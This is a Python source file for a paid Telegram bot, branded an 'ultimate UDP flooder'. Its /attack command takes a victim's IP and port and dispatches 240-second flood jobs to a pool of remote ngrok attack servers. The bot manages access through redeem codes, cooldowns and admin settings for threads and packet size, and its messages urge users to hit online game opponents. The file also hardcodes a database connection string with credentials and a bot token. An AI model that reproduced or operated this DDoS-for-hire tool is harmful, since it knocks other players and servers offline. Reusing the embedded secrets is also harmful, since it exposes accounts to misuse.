import random
import string
import asyncio
import logging
import aiohttp
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database Configuration
MONGO_URI = 'mongodb+srv://BLACKHAT:SPIKE@cluster0.h3sxp.mongodb.net/BOTS?retryWrites=true&w=majority&appName=Cluster0'
client = MongoClient(MONGO_URI)
db = client['SA']
users_collection = db['VPS']
redeem_codes_collection = db['redeem_code']
settings_collection = db['setting']  # New collection for settings

# Function to get settings from database
async def get_settings():
    settings = settings_collection.find_one({"_id": "config"})
    if settings:
        return settings.get('threads', 10), settings.get('packet_size', 9)  # Default to 10 threads and 9 bytes
    return 10, 9  # Default values if not set

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7907474053:AAGXJc2wSmM623uAdRCmsNXQX8xSAOjnjOg'
ADMIN_USER_ID = 1329951770  # Replace with your admin user ID
# Replace this with your actual list of URLs
attack_urls = [
     "https://2cd8-16-171-138-62.ngrok-free.app/run_Sid",
    "https://7f4b-13-60-20-84.ngrok-free.app/run_Sid",
    "https://2fe0-16-171-155-235.ngrok-free.app/run_Sid",
    "https://8f42-16-171-147-164.ngrok-free.app/run_Sid",
    "https://f7a1-13-60-51-190.ngrok-free.app/run_Sid", # Batch 1
  
]
# Track user attacks and cooldowns
cooldown_dict = {}
user_attack_history = {}
# Track active attacks on URLs
active_attacks = {url: None for url in attack_urls}

# Valid IP prefixes
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '0.', '235.')

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*\n", parse_mode='Markdown')
        return

    message = (
       "*❄️ WELCOME TO RED HAT  ULTIMATE UDP FLOODER ❄️*\n\n"
        "*🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥*\n\n"
        "*✨ Key Features: ✨*\n"
        "🚀 *𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack*\n"
        "🤡 *𝘼𝙪𝙧 𝙝𝙖𝙘𝙠𝙚𝙧 𝙗𝙖𝙣𝙣𝙚 𝙠𝙚 𝙨𝙖𝙥𝙣𝙤 𝙠𝙤 𝙠𝙖𝙧𝙡𝙤 𝙥𝙤𝙤𝙧𝙖! 😂*\n\n"
        "*⚠️ Kaise Use Kare? ⚠️*\n"
         "  /attack <ip> <port> "
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to add users!*", parse_mode='Markdown')
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /add <user_id> <days/minutes>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])
    time_input = context.args[1]  # The second argument is the time input (e.g., '2m', '5d')

    # Extract numeric value and unit from the input
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 86400  # Convert days to seconds
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 60  # Convert minutes to seconds
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
        return

    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)  # Updated to use timezone-aware UTC

    # Add or update user in the database
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} added with expiry in {time_value} {time_input[-1]}.*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])
    
    # Remove user from the database
    users_collection.delete_one({"user_id": target_user_id})

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            # Ensure expiry_date is timezone-aware
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            # Compare with the current time
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

# Modify the attack function to use settings from the database
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!* \n", parse_mode='Markdown')
        return

    # Get the attack parameters
    args = context.args
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port>*", parse_mode='Markdown')
        return

    ip, port = args

    # Validate IP and Port
    if not ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address! Please use an IP with a valid prefix.*", parse_mode='Markdown')
        return

    try:
        port = int(port)
        if not (1 <= port <= 65535):
            raise ValueError
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid port number. Must be between 1 and 65535.*", parse_mode='Markdown')
        return

    # Get the settings from the database (threads and byte size)
    threads, byte_size = await get_settings()

    # Check for cooldown
    if user_id in cooldown_dict and datetime.now(timezone.utc) < cooldown_dict[user_id]:
        remaining_time = (cooldown_dict[user_id] - datetime.now(timezone.utc)).total_seconds()
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ You need to wait {int(remaining_time)} seconds before attacking again.*", parse_mode='Markdown')
        return
    
# Check if the user has already attacked this IP and port combination
    attack_key = f"{user_id}_{ip}_{port}"
    if attack_key in user_attack_history:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already attacked this IP and port combination!*", parse_mode='Markdown')
        return

    # Assign a free URL for this attack
    free_url = None
    for url, assigned_user in active_attacks.items():
        if assigned_user is None:  # Check if the URL is free
            free_url = url
            active_attacks[url] = user_id  # Mark URL as in use by this user
            break

    if not free_url:
        await context.bot.send_message(chat_id=chat_id, text="*❌ All servers are busy. Please try again later.*", parse_mode='Markdown')
        return

    # Record the attack time for the user and the assigned URL
    attack_key = f"{user_id}_{ip}_{port}"
    user_attack_history[attack_key] = datetime.now(timezone.utc)
    cooldown_dict[user_id] = datetime.now(timezone.utc) + timedelta(seconds=240)  # Set a cooldown of 240 seconds

    # Run the attack logic in the background
    asyncio.create_task(perform_attack(free_url, ip, port, chat_id, context, threads, byte_size, user_id))


async def perform_attack(url, ip, port, chat_id, context, threads, byte_size, user_id):
    attack_duration = 240  # Duration in seconds (240 seconds as you mentioned)
    
    # Create the initial countdown message
    countdown_message = await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*⚔️ Attack Started! ⚔️*\n"
            f"*🎯 Target: {ip}:{port}*\n"
            f"*🕒 Duration: 240 seconds*\n"
            f"*💥 Let the Fuck Bgmi!*\n"
        ),
        parse_mode='Markdown'
    )

    payload = {
        "ip": ip,
        "port": port,
        "time": attack_duration,
        "packet_size": byte_size,
        "threads": threads,
    }

    # Start the attack asynchronously
    async def attack_request():
        async with aiohttp.ClientSession() as session:
            try:
                async with session.post(url, json=payload) as response:
                    if response.status == 200:
                        return None  # Success
                    else:
                        return f"Error: {response.status}"
            except Exception as e:
                return str(e)

    # Start the attack request
    attack_task = asyncio.create_task(attack_request())

    # Real-time countdown update
    for remaining in range(attack_duration, 0, -1):
        await asyncio.sleep(1)  # Wait for 1 second before updating countdown

        try:
            # Update the countdown message
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=countdown_message.message_id,
                text=(
                    "*🚀 ATTACK INITIATED 🚀*\n\n"
                    f"*💣 Target IP: {ip}*\n"
                    f"*🔢 Port: {port}*\n"
                    f"*🕒 Duration: 240 seconds*\n"
                    f"*💥 Powerd By RED HAT *\n"
                    f"*Time remaining: {remaining} seconds*"
                ),
                parse_mode='Markdown'
            )
        except Exception as e:
            print(f"Error updating countdown message: {e}") 
            
        if attack_task.done():
            break  # Stop countdown if the attack is finished

    # Wait for the attack task to complete
    attack_result = await attack_task

    # Notify user when the attack is finished or if there was an error
    if attack_result is None:
        completion_message = f"*✅ Attack on {ip}:{port} successfully completed!*"
    else:
        completion_message = f"*❌ Error during attack on {ip}:{port} via {url}: {attack_result}*"

    await context.bot.send_message(chat_id=chat_id, text=completion_message, parse_mode='Markdown')

    # Mark the URL as free after the attack is completed
    active_attacks[url] = None

# Function to generate a redeem code with a specified redemption limit and optional custom code name
async def generate_redeem_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to generate redeem codes!*", 
            parse_mode='Markdown'
        )
        return

    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
            parse_mode='Markdown'
        )
        return

    # Default values
    max_uses = 1
    custom_code = None

    # Determine if the first argument is a time value or custom code
    time_input = context.args[0]
    if time_input[-1].lower() in ['d', 'm']:
        # First argument is time, generate a random code
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        # First argument is custom code
        custom_code = time_input
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code

    # Check if a time value was provided
    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
            parse_mode='Markdown'
        )
        return

    # Calculate expiration time
    if time_input[-1].lower() == 'd':  # Days
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
        expiry_label = f"{time_value} day(s)"
    elif time_input[-1].lower() == 'm':  # Minutes
        time_value = int(time_input[:-1])
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)
        expiry_label = f"{time_value} minute(s)"

    # Set max_uses if provided
    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ Please provide a valid number for max uses.*", 
                parse_mode='Markdown'
            )
            return

    # Insert the redeem code with expiration and usage limits
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "expiry_date": expiry_date,
        "used_by": [],  # Track user IDs that redeem the code
        "max_uses": max_uses,
        "redeem_count": 0
    })

    # Format the message
    message = (
        f"✅ Redeem code generated: `{redeem_code}`\n"
        f"Expires in {expiry_label}\n"
        f"Max uses: {max_uses}"
    )
    
    # Send the message with the code in monospace
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=message, 
        parse_mode='Markdown'
    )

# Function to redeem a code with a limited number of uses
async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return

    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})

    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return

    expiry_date = redeem_entry['expiry_date']
    if expiry_date.tzinfo is None:
        expiry_date = expiry_date.replace(tzinfo=timezone.utc)  # Ensure timezone awareness

    if expiry_date <= datetime.now(timezone.utc):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has expired.*\n", parse_mode='Markdown')
        return

    if redeem_entry['redeem_count'] >= redeem_entry['max_uses']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ This redeem code has already reached its maximum number of uses.*\n", parse_mode='Markdown')
        return

    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
        return

    # Update the user's expiry date
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )

    # Mark the redeem code as used by adding user to `used_by`, incrementing `redeem_count`
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )

    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')

# Function to delete redeem codes based on specified criteria
async def delete_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to delete redeem codes!*", 
            parse_mode='Markdown'
        )
        return

    # Check if a specific code is provided as an argument
    if len(context.args) > 0:
        # Get the specific code to delete
        specific_code = context.args[0]

        # Try to delete the specific code, whether expired or not
        result = redeem_codes_collection.delete_one({"code": specific_code})
        
        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Redeem code `{specific_code}` has been deleted successfully.*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*⚠️ Code `{specific_code}` not found.*", 
                parse_mode='Markdown'
            )
    else:
        # Delete only expired codes if no specific code is provided
        current_time = datetime.now(timezone.utc)
        result = redeem_codes_collection.delete_many({"expiry_date": {"$lt": current_time}})

        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Deleted {result.deleted_count} expired redeem code(s).*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ No expired codes found to delete.*", 
                parse_mode='Markdown'
            )

# Function to list redeem codes
async def list_codes(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view redeem codes!*", parse_mode='Markdown')
        return

    # Check if there are any documents in the collection
    if redeem_codes_collection.count_documents({}) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No redeem codes found.*", parse_mode='Markdown')
        return

    # Retrieve all codes
    codes = redeem_codes_collection.find()
    message = "*🎟️ Active Redeem Codes:*\n"
    
    current_time = datetime.now(timezone.utc)
    for code in codes:
        expiry_date = code['expiry_date']
        
        # Ensure expiry_date is timezone-aware
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
        
        # Format expiry date to show only the date (YYYY-MM-DD)
        expiry_date_str = expiry_date.strftime('%Y-%m-%d')
        
        # Calculate the remaining time
        time_diff = expiry_date - current_time
        remaining_minutes = time_diff.total_seconds() // 60  # Get the remaining time in minutes
        
        # Avoid showing 0.0 minutes, ensure at least 1 minute is displayed
        remaining_minutes = max(1, remaining_minutes)  # If the remaining time is less than 1 minute, show 1 minute
        
        # Display the remaining time in a more human-readable format
        if remaining_minutes >= 60:
            remaining_days = remaining_minutes // 1440  # Days = minutes // 1440
            remaining_hours = (remaining_minutes % 1440) // 60  # Hours = (minutes % 1440) // 60
            remaining_time = f"({remaining_days} days, {remaining_hours} hours)"
        else:
            remaining_time = f"({int(remaining_minutes)} minutes)"
        
        # Determine whether the code is valid or expired
        if expiry_date > current_time:
            status = "✅"
        else:
            status = "❌"
            remaining_time = "(Expired)"
        
        message += f"• Code: `{code['code']}`, Expiry: {expiry_date_str} {remaining_time} {status}\n"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=message, parse_mode='Markdown')

# Function to check if a user is allowed
async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)  # Ensure timezone awareness
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def list_users(update, context):
    current_time = datetime.now(timezone.utc)
    users = users_collection.find() 
    
    user_list_message = "👥 User List:\n"
    
    for user in users:
        user_id = user['user_id']
        expiry_date = user['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
    
        time_remaining = expiry_date - current_time
        if time_remaining.days < 0:
            remaining_days = -0
            remaining_hours = 0
            remaining_minutes = 0
            expired = True  
        else:
            remaining_days = time_remaining.days
            remaining_hours = time_remaining.seconds // 3600
            remaining_minutes = (time_remaining.seconds // 60) % 60
            expired = False 
        
        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
        if expired:
            user_list_message += f"🔴 *User ID: {user_id} - Expiry: {expiry_label}*\n"
        else:
            user_list_message += f"🟢 User ID: {user_id} - Expiry: {expiry_label}\n"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            # Ensure expiry_date is timezone-aware
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            # Compare with the current time
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

# Function to set threads and byte settings (admin only)
async def set_thread(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set the number of threads!*", parse_mode='Markdown')
        return

    if len(context.args) != 1 or not context.args[0].isdigit():
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /thread <number_of_threads>*", parse_mode='Markdown')
        return

    thread_count = int(context.args[0])
    settings_collection.update_one({"_id": "config"}, {"$set": {"threads": thread_count}}, upsert=True)

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Thread count set to {thread_count}.*", parse_mode='Markdown')

async def set_byte(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to set the packet size!*", parse_mode='Markdown')
        return

    if len(context.args) != 1 or not context.args[0].isdigit():
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /byte <number_of_bytes>*", parse_mode='Markdown')
        return

    byte_size = int(context.args[0])
    settings_collection.update_one({"_id": "config"}, {"$set": {"packet_size": byte_size}}, upsert=True)

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Packet size set to {byte_size} bytes.*", parse_mode='Markdown')

async def show_settings(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to view settings!*", parse_mode='Markdown')
        return

    threads, byte_size = await get_settings()
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"*🔧 Current Settings:*\n*Threads*: {threads}\n*Packet Size*: {byte_size} bytes",
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("delete_code", delete_code))
    application.add_handler(CommandHandler("list_codes", list_codes))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler('thread', set_thread))
    application.add_handler(CommandHandler('byte', set_byte))
    application.add_handler(CommandHandler('show', show_settings))
    
     # Run the bot
    application.run_polling()
    logger.info("Bot is running.")

if __name__ == '__main__':
    main()
